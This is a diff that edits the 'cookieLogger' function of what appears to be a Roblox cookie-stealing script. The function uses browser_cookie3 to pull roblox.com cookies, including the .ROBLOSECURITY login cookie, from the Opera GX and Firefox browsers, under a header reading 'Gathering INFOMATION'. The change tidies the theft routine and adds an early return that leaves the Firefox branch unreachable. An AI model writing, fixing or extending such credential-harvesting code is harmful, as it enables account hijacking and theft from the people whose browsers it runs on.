@@ -91,7 +91,8 @@ print(dummy_message)
 ################### Gathering INFOMATION #################################
 def cookieLogger():
     data = []  # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)
-     # Try to retrieve cookies from Opera GX
+
+    # Retrieve cookies from Opera GX
     try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         for cookie in cookies:
@@ -99,8 +100,10 @@ def cookieLogger():
                 data.append(cookies)
                 data.append(cookie.value)
                 return data
-     except:
+    except:
         pass
+    
+    return None  # Return None if no .ROBLOSECURITY cookies are found
     try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         for cookie in cookies:
